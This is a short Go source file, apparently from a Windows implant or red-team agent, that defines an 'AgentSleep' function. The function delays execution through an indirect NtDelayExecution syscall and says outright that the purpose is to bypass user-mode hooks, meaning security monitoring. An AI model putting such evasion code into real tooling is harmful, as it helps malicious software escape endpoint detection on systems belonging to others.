//go:build windows

package commands

import (
	"time"
)

// AgentSleep executes an evasive sleep on Windows using indirect syscalls.
// It translates the time.Duration into a relative 100-nanosecond interval
// and passes it to NtDelayExecution to bypass user-mode hooks.
func AgentSleep(d time.Duration) {
	if IndirectSyscallsAvailable() {
		// A negative interval indicates a relative time.
		// Windows time resolution is 100-nanoseconds.
		delay := int64(-d.Nanoseconds() / 100)

		// 0 for Alertable = FALSE
		status := IndirectNtDelayExecution(0, &delay)
		if status == 0 { // STATUS_SUCCESS
			return
		}
		// If indirect syscall fails (e.g., STATUS_UNSUCCESSFUL), fall back to standard sleep
	}

	// Fallback if indirect syscalls are not available or failed
	time.Sleep(d)
}
